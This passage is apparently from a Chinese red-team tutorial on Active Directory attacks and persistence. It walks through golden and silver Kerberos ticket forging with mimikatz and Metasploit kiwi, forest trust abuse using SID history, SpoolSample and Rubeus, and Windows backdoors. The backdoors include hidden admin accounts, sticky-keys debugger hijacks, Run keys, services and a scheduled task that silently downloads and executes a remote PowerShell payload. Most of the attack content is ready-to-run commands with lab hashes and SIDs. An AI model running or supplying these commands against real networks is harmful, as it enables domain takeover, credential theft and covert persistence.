<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:teamssix.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<p>这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</p>
<p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 &#x2F;user 参数，可以只导出指定用户的值。</p>
<p>或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure>

<h3 id="2-获取基本信息"><a href="#2-获取基本信息" class="headerlink" title="2.获取基本信息"></a>2.获取基本信息</h3><p>获取域 SID</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p>这里得到 administrator 的 SID 为  S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</p>
<p>获取当前用户的 SID</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<p>查询域管理员账号</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>

<p>查询域名</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<h3 id="3-制作黄金票据"><a href="#3-制作黄金票据" class="headerlink" title="3.制作黄金票据"></a>3.制作黄金票据</h3><p>先将票据清空</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>

<p>生成票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:Administrator /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /krbtgt:d685b9c4fa2d318a9943ed68948af087 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p>传递票据并注入内存</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>

<h3 id="4-验证权限"><a href="#4-验证权限" class="headerlink" title="4.验证权限"></a>4.验证权限</h3><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p>
<p><img src="https://pic1.zhimg.com/v2-e9dacdba9b63a6a57f785e0691ab4809_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic1.zhimg.com/80/v2-e9dacdba9b63a6a57f785e0691ab4809_720w.jpg?source=3af55fa1" alt="img"></p>
<p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:Administrator /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p>
<h3 id="5-MSF-下的利用"><a href="#5-MSF-下的利用" class="headerlink" title="5.MSF 下的利用"></a>5.MSF 下的利用</h3><p>首先上线一个普通用户，然后加载 kiwi 模块</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure>

<p>生成黄金票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t /root/administrator.ticket</span><br></pre></td></tr></table></figure>

<p>将黄金票据注入内存</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use /root/administrator.ticket</span><br></pre></td></tr></table></figure>

<p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p>
<p><img src="https://pica.zhimg.com/v2-fe639a342c864e23e6ecc360d334f240_720w.jpg?source=3af55fa1" alt="img"><img src="https://pica.zhimg.com/80/v2-fe639a342c864e23e6ecc360d334f240_720w.jpg?source=3af55fa1" alt="img"></p>
<h2 id="八：白银票据"><a href="#八：白银票据" class="headerlink" title="八：白银票据"></a>八：白银票据</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p>
<blockquote>
<p> Kerberos 协议详解：<a href="http://link.zhihu.com/?target=https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p>
</blockquote>
<p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p>
<p>白银票据与黄金票据的区别：</p>
<p>1.白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p>
<p>2.白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p>
<p>想利用白银票据需要先知道以下信息：</p>
<ul>
<li>域名</li>
<li>域 SID</li>
<li>目标服务器的 FQDN 即完整的域名</li>
<li>可利用的服务</li>
<li>服务账户的 NTLM 哈希</li>
<li>伪造的用户名即任意用户名</li>
</ul>
<h3 id="1-伪造-CIFS-服务权限"><a href="#1-伪造-CIFS-服务权限" class="headerlink" title="1.伪造 CIFS 服务权限"></a>1.伪造 CIFS 服务权限</h3><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>

<p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br><span class="line"></span><br><span class="line"># 或者在 mimikatz 里清除</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>

<p>使用 mimikatz 生成伪造的白银票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;kerberos::golden /user:t /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /target:dc /rc4:ef9e49a41feaa171f642016fd4cb7e7a /service:cifs /ptt&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="https://pic1.zhimg.com/v2-ae594eab710f3508fc4a6677536398a0_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic1.zhimg.com/80/v2-ae594eab710f3508fc4a6677536398a0_720w.jpg?source=3af55fa1" alt="img"></p>
<p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p>
<h3 id="2-伪造-LDAP-服务权限"><a href="#2-伪造-LDAP-服务权限" class="headerlink" title="2.伪造 LDAP 服务权限"></a>2.伪造 LDAP 服务权限</h3><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;lsadump::dcsync /dc:dc /domain:teamssix.com /user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure>

<p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p>
<p>接下来生成 LDAP 服务的白银票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;kerberos::golden /user:t /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /target:dc /rc4:ef9e49a41feaa171f642016fd4cb7e7a /service:ldap /ptt&quot; exit</span><br></pre></td></tr></table></figure>



<p><img src="https://pic1.zhimg.com/v2-17aab8a921cfedeadd653f12de440f9f_720w.jpg?source=3af55fa1" alt="img"><img src="https://pic1.zhimg.com/80/v2-17aab8a921cfedeadd653f12de440f9f_720w.jpg?source=3af55fa1" alt="img"></p>
<h2 id="九：金票和银票的区别"><a href="#九：金票和银票的区别" class="headerlink" title="九：金票和银票的区别"></a>九：金票和银票的区别</h2><h3 id="1-获取的权限不同"><a href="#1-获取的权限不同" class="headerlink" title="1.获取的权限不同"></a>1.获取的权限不同</h3><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p>
<h3 id="2-认证流程不同"><a href="#2-认证流程不同" class="headerlink" title="2.认证流程不同"></a>2.认证流程不同</h3><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p>
<h3 id="3-加密方式不同"><a href="#3-加密方式不同" class="headerlink" title="3.加密方式不同"></a>3.加密方式不同</h3><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p>
<h1 id="跨域攻击分析"><a href="#跨域攻击分析" class="headerlink" title="跨域攻击分析"></a>跨域攻击分析</h1><p><strong>前言</strong></p>
<p>常见的跨域攻击方法有以下几种：</p>
<p>i.利用常规的渗透方法，比如 Web 漏洞</p>
<p>ii.利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p>
<p>iii.利用域信任关系</p>
<p>这里主要看第三种：域信任关系</p>
<p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p>
<p>域信任关系可分为单向信任和双向信任。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p>
<p>域信任关系又可分为内部信任和外部信任。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递。</p>
<p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p>
<h2 id="一：获取域信息"><a href="#一：获取域信息" class="headerlink" title="一：获取域信息"></a>一：获取域信息</h2><p>这里使用工具 lg 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p>
<p>枚举 teamssix 域中的用户组</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lg.exe teamssix\.</span><br></pre></td></tr></table></figure>

<p>枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lg.exe \\dc</span><br></pre></td></tr></table></figure>

<p>枚举远程计算机的用户名</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lg.exe \\dc -lu</span><br></pre></td></tr></table></figure>

<p>枚举远程系统中全部用户的 SID</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lg.exe \\dc -lu -sidsout</span><br></pre></td></tr></table></figure>

<p>枚举远程系统指定组中的所有成员的 SID</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lg.exe \\dc\administrators -lu -sidsout</span><br></pre></td></tr></table></figure>

<h2 id="二：利用域信任密钥获取目标域权限"><a href="#二：利用域信任密钥获取目标域权限" class="headerlink" title="二：利用域信任密钥获取目标域权限"></a>二：利用域信任密钥获取目标域权限</h2><p>这里环境信息为：</p>
<p>父域的域控：<a href="http://link.zhihu.com/?target=http://dc.teamssix.com">http://dc.teamssix.com</a></p>
<p>子域的域控：<a href="http://link.zhihu.com/?target=http://subdc.sub.teamssix.com">http://subdc.sub.teamssix.com</a></p>
<p>子域内的计算机：<a href="http://link.zhihu.com/?target=http://user4.sub.teamssix.com">http://user4.sub.teamssix.com</a></p>
<p>子域内的普通用户：user4</p>
<p>在子域的域控中使用 mimikatz 获取需要的信息</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::lsa /patch /user:administrator&quot; &quot;lsadump::trust /patch&quot; exit</span><br></pre></td></tr></table></figure>

<p>得到当前域的 SID .父域的 SID 和子域域管 NTLM 哈希后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p>
<blockquote>
<p> 这里的 sids 是父域的 sid，sids 后的 519 表示创建的用户属于父域的管理员组</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /domain:sub.teamssix.com /sid:S-1-5-21-1655164184-1934932396-2547489287 /sids:S-1-5-21-2230503874-1187844892-774991719-519 /rc4:5bfd59b5e1f78a794f714af07eac869f /user:administrator /service:krbtgt /target:teamssix.com /ticket:subdc_administrator.kirbi&quot; exit</span><br></pre></td></tr></table></figure>

<p>利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asktgs subdc_administrator.kirbi cifs/dc.teamssix.com</span><br></pre></td></tr></table></figure>

<p>将获取的 TGS 票据注入到内存中</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kirbikator lsa cifs.dc.teamssix.com.kirbi</span><br></pre></td></tr></table></figure>

<p>使用 dir 访问目标域控</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.teamssix.com\c$</span><br></pre></td></tr></table></figure>



<p><img src="https://pic1.zhimg.com/v2-3f4cc3a3ed4197ca7861c36253a2367a_720w.jpg?source=d16d100b" alt="img"><img src="https://pic1.zhimg.com/80/v2-3f4cc3a3ed4197ca7861c36253a2367a_720w.jpg?source=d16d100b" alt="img"></p>
<h2 id="三：利用-krbtgt-散列值获取目标域的权限"><a href="#三：利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="三：利用 krbtgt 散列值获取目标域的权限"></a>三：利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p>
<p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get caption,sid</span><br><span class="line">whoami /user</span><br><span class="line">adfind.exe -sc u:user4 | findstr Sid</span><br><span class="line">Get-DomainSID sub.teamssix.com  # PowerView 里的命令</span><br></pre></td></tr></table></figure>

<p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug &quot;lsadump::lsa /patch /user:krbtgt&quot; sekurlsa::krbtgt exit</span><br></pre></td></tr></table></figure>

<p>在子域普通用户权限的计算机中构造黄金票据</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;Kerberos::golden /user:Administrator /domain:sub.teamssix.com /sid:S-1-5-21-1655164184-1934932396-2547489287 /sids:S-1-5-21-2230503874-1187844892-774991719-519 /krbtgt:b53a5c7c51648f033b96971e7ae4ee45 /ptt&quot; exit</span><br></pre></td></tr></table></figure>



<p><img src="https://pic3.zhimg.com/v2-67629c31193cb3da4fe6202c9a071f0e_720w.jpg?source=d16d100b" alt="img"><img src="https://pic3.zhimg.com/80/v2-67629c31193cb3da4fe6202c9a071f0e_720w.jpg?source=d16d100b" alt="img"></p>
<h2 id="四：利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#四：利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="四：利用无约束委派和 MS-RPRN 获取信任林权限"></a>四：利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p>
<p>假设这里获取了 <a href="http://link.zhihu.com/?target=http://teamssix.com">http://teamssix.com</a> 域的域控权限，且 <a href="http://link.zhihu.com/?target=http://0day.org">http://0day.org</a> 与 <a href="http://link.zhihu.com/?target=http://teamssix.com">http://teamssix.com</a> 域有林信任关系</p>
<p>首先在 <a href="http://link.zhihu.com/?target=http://teamssix.com">http://teamssix.com</a> 的域控上监听身份认证请求</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe monitor /interval:5 /filteruser:OWA2010SP3$</span><br><span class="line">interval: 用于设置监控的时间间隔</span><br><span class="line">filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名</span><br></pre></td></tr></table></figure>

<p>开启监听后，使用 SpoolSample 工具让 <a href="http://link.zhihu.com/?target=http://OWA2010SP3.0day.org">http://OWA2010SP3.0day.org</a> 向 <a href="http://link.zhihu.com/?target=http://dc.teamssix.com">http://dc.teamssix.com</a> 发送身份认证请求</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com</span><br></pre></td></tr></table></figure>

<p>获得票据后，使用 rubeus 将票据注入内存</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rubeus.exe ptt /ticket:&lt;TGT 票据&gt;</span><br></pre></td></tr></table></figure>

<p>使用 mimikatz 获取目标的 krbtgt 散列值</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:0day.org /user:0day\krbtgt&quot; exit</span><br></pre></td></tr></table></figure>

<p>接下来，构造黄金票据并将其注入内存，就能够获得 <a href="http://link.zhihu.com/?target=http://0day.org">http://0day.org</a> 域控的权限了</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;Kerberos::golden /user:Administrator /domain:0day.org /sid:5-1-5-21-1812920812-2335051732-3517558806 /rc4:b53a5c8c51648f053b96971e7ae4ee25 /ptt&quot; exi</span><br></pre></td></tr></table></figure>





<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>在本文中，将从Windows 主机后门.Windows 文件隐藏.域后门.Linux 后门.Linux 文件隐藏这五个方面去看红队中的权限维持。</p>
<blockquote>
<p>注意：本系列侧重的是面，不是具体的点，因此文中不会面面俱到的谈论每个方法具体怎么利用，这里更加看着的是知识点的一个梳理。</p>
</blockquote>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995329-754146-image.png" alt="img"></p>
<h2 id="一：Windows-主机后门"><a href="#一：Windows-主机后门" class="headerlink" title="一：Windows 主机后门"></a>一：Windows 主机后门</h2><h3 id="1-隐藏账号"><a href="#1-隐藏账号" class="headerlink" title="1.隐藏账号"></a>1.隐藏账号</h3><p>这个是比较常见的创建后门的方法，直接建立一个隐藏账号</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user teamssix$ Passw0rd /add</span><br><span class="line">net localgroup administrators teamssix$ /add</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995527-217032-image.png" alt="img"></p>
<p>虽然使用 net user 是看不到这个账号的，但是在控制面板里可以看到，因此这种隐藏效果并不是很好</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995534-457308-image.png" alt="img"></p>
<p>想要更好的隐藏效果，可以通过注册表克隆用户实现，只是操作起来比较繁琐，所以我这边写了一个利用注册表创建隐藏用户的小工具。</p>
<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p>
<p>直接使用以下命令，就可以轻松的创建一个隐藏用户</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount.exe -u teamssix -p Passw0rd</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995553-108130-image.png" alt="img"></p>
<p>创建完后，通过 net user 和控制面板等等都是看不到这个账号的</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995605-909357-image.png" alt="img"></p>
<p>也可以拿来检查当前系统的隐藏账号</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount.exe -c</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995615-966153-image.png" alt="img"></p>
<p>删除用户也很方便</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateHiddenAccount.exe -d teamssix</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995634-209962-image.png" alt="img"></p>
<h3 id="2-计划任务"><a href="#2-计划任务" class="headerlink" title="2.计划任务"></a>2.计划任务</h3><p>计划任务也是比较常见的权限维持方法，计划任务在 Win7 之前使用 at 命令，之后的系统中使用 schtasks 命令。</p>
<p>例如每小时执行一次 calc.exe</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn updater /tr calc.exe /sc hourly /mo 1</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995646-60179-image.png" alt="img"></p>
<p>当系统空闲时，执行 CS 上线 PowerShell 脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn WindowsUpdate /tr &quot;powershell.exe -nop -w hidden -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;&#x27;http://172.16.214.1:80/a&#x27;&#x27;&#x27;))&#x27;&quot; /sc onidle /i 1</span><br></pre></td></tr></table></figure>

<p>除了使用系统自带命令外，还可以使用 PowerSploit 渗透测试框架里的 Persistence 模块自动创建计划任务后门。</p>
<h3 id="3-shift-后门"><a href="#3-shift-后门" class="headerlink" title="3.shift 后门"></a>3.shift 后门</h3><p>这个也算是比较知名的后门方法了，直接使用 copy 命令即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /y</span><br></pre></td></tr></table></figure>

<p>如果提示访问被拒绝，可以在管理员权限下，加上 everyone 的权限再试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacls  C:\Windows\System32\sethc.exe  /T /E /G everyone:F</span><br></pre></td></tr></table></figure>

<p>然后在登录界面按 5 下 shift 键就能打开 cmd 窗口了</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995657-865749-image.png" alt="img"></p>
<p>使用注册表也可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>

<p>除了 按 5 下 shift 打开粘滞键的功能外，同样的道理，还可以使用辅助工具.放大镜.屏幕键盘等等。</p>
<p>辅助工具 utilman.exe</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995681-882230-image.png" alt="img"></p>
<p>屏幕键盘 osk.exe</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995698-111867-image.png" alt="img"></p>
<p>放大镜 Magnify.exe</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995711-431791-image.png" alt="img"></p>
<h3 id="4-组策略"><a href="#4-组策略" class="headerlink" title="4.组策略"></a>4.组策略</h3><p>新建一个 bat 文件，这里 bat 内容为 calc</p>
<p>使用 gpedit.msc 进入本地组策略，来到用户配置–》Windows设置–》脚本登录，点击浏览选择 bat 文件，当用户登录时就会触发这个 bat 文件。</p>
<p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642995722-703721-image.png" alt="img"></p>
<h3 id="5-注册表"><a href="#5-注册表" class="headerlink" title="5.注册表"></a>5.注册表</h3><p>在系统启动的注册表下添加恶意程序，这样当用户登录系统时，exe 就会被运行，或者将 exe 直接放到系统启动的文件夹里也是一样的道理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <span class="string">&quot;Vmware Regg&quot;</span> /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\calc.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995733-68515-image.png" alt="img"></p>
<h3 id="6-服务自启动"><a href="#6-服务自启动" class="headerlink" title="6.服务自启动"></a>6.服务自启动</h3><p>直接使用命令创建服务</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create teamssix start=auto binPath=<span class="string">&quot;cmd.exe /k ping -n 1 test.xxx.ceye.io&quot;</span> obj=Localsystem</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995744-540260-image.png" alt="img"></p>
<p>启动该服务</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start teamssix</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995751-115259-image.png" alt="img"></p>
<p>虽然报错了，但其实是被执行的</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995756-800285-image.png" alt="img"></p>
<p>只不过这种创建服务的方法隐藏性太弱，直接在服务里就能看到</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111711.png" alt="img"></p>
<p>可以在创建完服务后，使用以下命令将创建的服务隐藏，这样不论是在服务中，还是使用命令都查不到这个服务</p>
